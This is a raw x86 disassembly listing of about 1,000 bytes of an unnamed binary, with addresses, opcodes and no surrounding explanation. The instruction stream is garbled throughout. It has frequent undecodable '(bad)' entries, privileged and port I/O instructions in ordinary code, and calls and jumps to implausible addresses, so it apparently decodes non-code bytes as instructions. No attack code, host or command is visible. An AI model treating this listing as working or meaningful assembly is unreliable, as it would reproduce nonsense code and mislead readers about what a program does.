  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
